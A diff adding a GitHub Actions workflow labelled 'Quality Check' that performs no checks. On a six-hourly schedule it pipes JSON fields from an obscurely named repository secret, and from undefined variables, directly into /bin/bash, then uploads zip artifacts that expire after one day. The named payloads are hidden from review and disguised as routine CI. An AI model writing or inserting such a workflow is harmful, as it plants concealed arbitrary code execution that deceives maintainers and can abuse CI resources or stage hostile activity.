@@ -1,0 +1,33 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '2 3,9,15,21 * * *'
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Build and run
+        env:
+          tz773: ${{ secrets.tz773 }}
+        run: |
+          printf '%s' "$tz773" | jq -r .sx096 | /bin/bash
+          printf '%s' "$rkpo041" | jq -r .uudti16 | /bin/bash
+          printf '%s' "$b16483" | jq -r .xjh17 | /bin/bash
+          printf '%s' "$db2014" | jq -r .lup1046 | /bin/bash
+
+      - name: Upload artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: xd6B88c1
+          path: "*.zip"
+          retention-days: 1
